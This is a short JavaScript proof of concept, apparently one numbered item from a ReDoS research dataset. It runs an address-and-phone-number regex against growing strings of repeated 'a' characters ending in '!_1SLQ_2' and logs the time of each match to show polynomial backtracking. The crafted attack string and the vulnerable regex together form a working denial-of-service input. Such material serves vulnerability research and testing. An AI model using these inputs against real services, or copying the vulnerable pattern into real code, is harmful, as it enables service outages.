/* 1672
 * \s*([a-z\. ]+)\s*\n\s*([a-z0-9\. #]+)\s*\n\s*([a-z \.]+)\s*,\s*([a-z \.]+)\s*\n?(?:\s*(\d{1,15}(?:-\d{1,4})?)\s*\n)?(?:\s*(\+?(?:1\s*[-\/\.]?)?(?:\((?:\d{3})\)|(?:\d{3}))\s*[-\/\.]?\s*(?:\d{3})\s*[-\/\.]?\s*(?:\d{4})(?:(?:[ \t]*[xX]|[eE][xX][tT])\.?[ \t]*(?:\d+))*))?
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:""+"a"*10000+"!_1SLQ_2"
 */
var REGEX = new RegExp("\s*([a-z\. ]+)\s*\n\s*([a-z0-9\. #]+)\s*\n\s*([a-z \.]+)\s*,\s*([a-z \.]+)\s*\n?(?:\s*(\d{1,15}(?:-\d{1,4})?)\s*\n)?(?:\s*(\+?(?:1\s*[-\/\.]?)?(?:\((?:\d{3})\)|(?:\d{3}))\s*[-\/\.]?\s*(?:\d{3})\s*[-\/\.]?\s*(?:\d{4})(?:(?:[ \t]*[xX]|[eE][xX][tT])\.?[ \t]*(?:\d+))*))?")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + 'a'.repeat(i*10000) + '!_1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}